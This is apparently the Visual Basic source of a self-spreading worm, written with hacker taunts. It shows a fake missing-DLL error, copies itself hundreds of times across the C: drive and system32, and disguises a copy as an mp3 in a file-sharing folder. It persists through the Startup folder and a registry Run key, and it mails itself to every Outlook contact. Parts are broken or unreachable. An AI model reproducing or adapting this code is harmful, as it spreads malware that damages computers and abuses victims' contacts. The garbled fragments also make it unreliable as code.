   private Sub Form_Unload(Cancel As Integer)
   Shell App.Path & "\" & App.EXEName & ".exe"
   End Sub
   Private Sub Form_Load()
   Form1.Visible = False
   On Error Resume Next
   MsgBox "Missing vital .dll file.  jajaj =) 0wn3d n b0n3d, n00bz0r", 16, Error

   Dim ProgramPath As String
   If Len(App.Path) <= 3 Then
    ProgramPath = App.Path & App.EXEName & ".exe"
    Else
    ProgramPath = App.Path & "\" & App.EXEName & ".exe"
   End If

   Dim Counter As Long
   For Counter = 1 To 50
   FileCopy ProgramPath, "C:\th3" & Counter & ".exe"
   FileCopy ProgramPath, "C:\0n3" & Counter & ".exe"
   FileCopy ProgramPath, "C:\arm3d" & Counter & ".exe"
   FileCopy ProgramPath, "C:\scis00r" & Counter & ".exe"
   FileCopy ProgramPath, "C:\WINDOWS\system32\lol" & Counter & ".exe"
   Next Counter
   End

   FileCopy App.Path & "\" & App.EXEName & ".exe", "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\onearmedscissor.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "C:\Program Files\KaZaA\My shared folder\The White Stripes - IM INFECTED.mp3"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Documents and Settings\All Users\Desktop\onearmedsciss0r.exe"
   End
    strFile = App.Path & "\" & App.EXEName & ".exe"
    If Command() = vbNullString Then
        FileCopy strFile, strNewFile
        WriteToRegistry
        Shell strNewFile & " \onearmedscissor", vbHide
        End If
        End Sub

   Private Sub WriteToRegistry()

    Dim objReg As Object
    Set objReg = CreateObject("wscript.shell")
    objReg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\" & strProjectName, strNewFile & " \theonearmedscissor"
    End Sub
     FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\InnocentFile.exe"
   Set so = CreateObject(fso)
   Set ol = CreateObject("Outlook.Application")
   Set out = Wscript.CreateObject("Outlook.Application")
   Set mapi = out.GetNameSpace("MAPI")
   Set a = mapi.AddressLists(1)
   For X = 1 To a.AddressEntries.Count
   Set Mail = ol.CreateItem(0)
   Mail.to = ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(X)
   Mail.Subject =baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaahjajajjaja i r TEH INFECT0R!! ACCEpt My BiAtCh AnD pH33r!!!!!! baaaaaaaaaaaaaaaaaajajaj I R TEH INF3CT!"
   Mail.Attachments.Add = "C:\Worm1.exe"
   Mail.Send
   Next
   ol.Quit
   End Sub
